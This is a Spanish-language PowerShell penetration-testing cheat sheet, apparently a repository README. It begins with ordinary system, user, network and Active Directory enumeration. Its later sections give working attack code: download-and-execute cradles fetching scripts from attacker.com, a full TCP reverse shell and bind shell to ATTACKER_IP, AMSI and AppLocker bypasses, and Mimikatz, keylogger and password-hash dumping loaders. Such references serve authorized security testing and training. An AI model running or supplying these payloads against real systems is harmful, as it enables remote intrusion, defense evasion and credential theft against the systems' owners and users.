# 💻 PowerShell: guía completa de pruebas de penetración

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


> **Compatibilidad y precisión:** Los ejemplos mezclan Windows PowerShell y PowerShell moderno. `Get-WmiObject` y `Get-EventLog` no están incluidos en PowerShell 7; véase [Microsoft: diferencias de versiones](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell). La política de ejecución no constituye una frontera de seguridad ([Microsoft](https://devblogs.microsoft.com/powershell/powershells-security-guiding-principles/)). Las evasiones de AMSI, AppLocker y el uso de PowerShell 2.0 dependen de la versión y las políticas; no se garantiza que funcionen. Las denominaciones de grupos son las del sistema en inglés. Algunos ejemplos combinan sintaxis de `cmd.exe` con PowerShell, como `dir /r` y la redirección con `<`; se conservan literalmente.


```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

## 📋 Índice

- [Fundamentos](#fundamentos)
- [Enumeración del sistema](#enumeración-del-sistema)
- [Enumeración de usuarios](#enumeración-de-usuarios)
- [Comandos de red](#comandos-de-red)
- [Operaciones de archivos](#operaciones-de-archivos)
- [Gestión de procesos y servicios](#gestión-de-procesos-y-servicios)
- [Operaciones del Registro](#operaciones-del-registro)
- [Active Directory](#active-directory)
- [Descarga y ejecución](#descarga-y-ejecución)
- [Shells inversas](#shells-inversas)
- [Técnicas de evasión](#técnicas-de-evasión)
- [Herramientas ofensivas](#herramientas-ofensivas)
- [Comandos en una línea](#comandos-en-una-línea)

---

<a id="fundamentos"></a>

## 🔰 Fundamentos

### Política de ejecución

```powershell
# Comprobar la política actual
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Omitir la política de ejecución (sesión actual)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Ejecutar un script omitiendo la política
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Obtener ayuda

```powershell
# Obtener ayuda de un comando
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Actualizar la ayuda
Update-Help

# Listar todos los comandos
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variables y operadores

```powershell
# Variables
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Variables de entorno
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Operadores de comparación
-eq   # Igual
-ne   # Distinto
-gt   # Mayor que
-lt   # Menor que
-like # Coincidencia con comodines
-match # Coincidencia con expresión regular
```

### Canalización y filtrado

```powershell
# Canalizar la salida
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Seleccionar propiedades
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Ordenar
Get-Process | Sort-Object CPU -Descending

# Dar formato a la salida
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="enumeración-del-sistema"></a>

## 🔍 Enumeración del sistema

### Información del sistema

```powershell
# Información del equipo
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Versión del sistema operativo
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Arquitectura
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Correcciones y parches
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Software instalado

```powershell
# Software de 64 bits
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Software de 32 bits en un sistema de 64 bits
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Usar WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Lista rápida
Get-Package
```

### Antivirus y seguridad

```powershell
# Obtener información del antivirus
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Estado del cortafuegos
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Reglas del cortafuegos
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Exclusiones de Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Tareas programadas

```powershell
# Listar las tareas programadas
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Detalles de la tarea
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="enumeración-de-usuarios"></a>

## 👤 Enumeración de usuarios

### Usuarios locales

```powershell
# Usuario actual
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Todos los usuarios locales
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Detalles del usuario
Get-LocalUser Administrator
net user Administrator

# Grupos del usuario
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Privilegios del usuario

```powershell
# Privilegios actuales
whoami /priv
whoami /all
whoami /groups

# Comprobar si se es administrador
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Grupos

```powershell
# Listar los grupos locales
Get-LocalGroup
net localgroup

# Miembros del grupo
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Usuarios con sesión iniciada

```powershell
# Sesiones iniciadas actualmente
query user
quser
qwinsta

# Inicios de sesión recientes
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="comandos-de-red"></a>

## 🌐 Comandos de red

### Configuración de red

```powershell
# Configuración IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Rutas
Get-NetRoute
route print

# Tabla ARP
Get-NetNeighbor
arp -a
```

### Puertos abiertos y conexiones

```powershell
# Conexiones TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Conexiones UDP
Get-NetUDPEndpoint

# Encontrar el proceso por puerto
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Pruebas de red

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Comprobar un puerto
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Trazar la ruta
Test-NetConnection -ComputerName google.com -TraceRoute

# Consulta DNS
Resolve-DnsName google.com
nslookup google.com
```

### Recursos compartidos de red

```powershell
# Listar los recursos compartidos
Get-SmbShare
net share

# Asignar una unidad de red
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Listar los recursos compartidos conectados
Get-SmbConnection
net use

# Acceder al recurso compartido
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="operaciones-de-archivos"></a>

## 📁 Operaciones de archivos

### Navegación y listado

```powershell
# Directorio actual
Get-Location
pwd

# Cambiar de directorio
Set-Location C:\Users
cd C:\Users

# Listar archivos
Get-ChildItem
Get-ChildItem -Force  # Incluir los ocultos
Get-ChildItem -Recurse
ls
dir

# Listar archivos ocultos
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Búsqueda de archivos

```powershell
# Buscar archivos por nombre
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Buscar archivos que contengan texto
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Buscar archivos grandes
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Buscar archivos modificados recientemente
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Lectura y escritura de archivos

```powershell
# Leer un archivo
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Escribir en un archivo
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Añadir al final

# Copiar, mover y eliminar
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Flujos de datos alternativos (ADS)

```powershell
# Listar los ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Leer un ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Escribir en un ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Eliminar un ADS
Remove-Item file.txt -Stream hidden
```

### Cálculo de hashes

```powershell
# Obtener el hash de un archivo
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Verificar el hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="gestión-de-procesos-y-servicios"></a>

## ⚙️ Gestión de procesos y servicios

### Procesos

```powershell
# Listar los procesos
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Detalles del proceso
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Iniciar un proceso
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Como administrador

# Detener un proceso
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Servicios

```powershell
# Listar los servicios
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Detalles del servicio
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Iniciar y detener servicios
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Ruta del servicio (para comprobar rutas sin comillas)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="operaciones-del-registro"></a>

## 📝 Operaciones del Registro

### Lectura del Registro

```powershell
# Listar las claves del Registro
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Obtener un valor del Registro
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Buscar en el Registro
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Escritura en el Registro

```powershell
# Crear una clave
New-Item -Path HKCU:\SOFTWARE\MyKey

# Establecer un valor
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Eliminar
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Ubicaciones importantes del Registro

```powershell
# Ubicaciones de inicio automático
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Desinstalación (software instalado)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (requiere SYSTEM)
# HKLM:\SAM\SAM

# Secretos de LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="active-directory"></a>

## 🏢 Active Directory

### Información del dominio

```powershell
# Información del dominio
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Controladores de dominio
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Información del bosque
Get-ADForest

# Relaciones de confianza
Get-ADTrust -Filter *
```

### Enumeración de usuarios (AD)

```powershell
# Todos los usuarios del dominio
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Usuario específico
Get-ADUser -Identity administrator -Properties *

# Usuarios con una propiedad específica
Get-ADUser -Filter {AdminCount -eq 1}  # Administradores
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Susceptible de Kerberoasting

# Buscar usuarios
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Enumeración de grupos (AD)

```powershell
# Todos los grupos
Get-ADGroup -Filter *

# Domain Administradores
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Administradores
Get-ADGroupMember "Enterprise Admins"

# Grupos del usuario
Get-ADPrincipalGroupMembership username
```

### Enumeración de equipos (AD)

```powershell
# Todos los equipos
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Controladores de dominio
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Servidores
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Información de GPO

```powershell
# Listar las GPO
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Detalles de la GPO
Get-GPO -Name "Default Domain Policy"

# Informe de GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="descarga-y-ejecución"></a>

## ⬇️ Descarga y ejecución

### Descargar archivos

```powershell
# Invoke-WebRequest (equivalente a wget/curl)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (más rápido, según el original)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Descargar una cadena (para scripts)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Transferencia BITS (más discreta, según el original)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Descargar y ejecutar (en memoria)

```powershell
# IEX: Invoke-Expression (sin guardar un archivo)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Con una variable
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Ejecución codificada

```powershell
# Codificar el comando en Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Ejecutar el comando codificado
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Codificador en una línea
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="shells-inversas"></a>

## 🔌 Shells inversas

### Shell inversa de PowerShell

```powershell
# Shell inversa TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Shell inversa en una línea

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell a la escucha (bind shell)

```powershell
# Vincular al puerto
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="técnicas-de-evasión"></a>

## 🛡️ Técnicas de evasión

### Evasión de la política de ejecución

```powershell
# Métodos de evasión
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Leer y canalizar
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Descargar una cadena (sin archivo en disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Evasión de AMSI

```powershell
# Evasión sencilla de AMSI (puede detectarse)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Ofuscado
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Modificación de memoria (requiere administrador, según el original)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (código completo de evasión)
```

### Evasión del modo de lenguaje restringido

```powershell
# Comprobar el modo de lenguaje
$ExecutionContext.SessionState.LanguageMode

# Si es ConstrainedLanguage, probar:
# - PowerShell 2.0 (si está disponible)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Evasión de AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Comprobar las reglas de AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="herramientas-ofensivas"></a>

## 🔫 Herramientas ofensivas

### PowerSploit

```powershell
# Descargar
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (enumeración de AD)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (elevación de privilegios)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Ejecución del stager, cargador inicial (desde Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Shell inversa
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Registrador de pulsaciones (keylogger)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="comandos-en-una-línea"></a>

## ⚡ Comandos en una línea

### Enumeración en una línea

```powershell
# Información del sistema
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Usuarios
Get-LocalUser | Select Name,Enabled

# Software instalado
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Puertos abiertos
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Servicios en ejecución
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Tareas programadas
schtasks /query /fo TABLE | findstr /v "TaskName"

# Estado del antivirus
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Cortafuegos
Get-NetFirewallProfile | Select Name,Enabled
```

### Descarga en una línea

```powershell
# Descarga mediante PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Tabla de comandos

| Finalidad | Comando |
|---------|---------|
| Usuario actual | `whoami` |
| Todos los usuarios | `Get-LocalUser` |
| Administradores | `Get-LocalGroupMember Administrators` |
| Información del sistema | `systeminfo` |
| Configuración IP | `Get-NetIPAddress` |
| Puertos abiertos | `Get-NetTCPConnection -State Listen` |
| Procesos | `Get-Process` |
| Servicios | `Get-Service \| Where Status -eq Running` |
| Buscar archivos | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Buscar contenido | `Select-String -Path "C:\*" -Pattern "password"` |
| Descargar un archivo | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Ejecución codificada | `powershell -enc <base64>` |

---

## 📚 Recursos

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Guías rápidas relacionadas
- [Mimikatz](../../Mimikatz/translations/README.es.md)
- [Elevación de privilegios en Windows](../../Windows-PrivEsc/translations/README.es.md)
- [Metasploit](../../Metasploit/translations/README.es.md)

---

<p align="center">
  <b>💻 ¡Domina PowerShell para las pruebas de penetración!</b><br>
  <i>El lenguaje de scripting más potente de Windows</i>
</p>
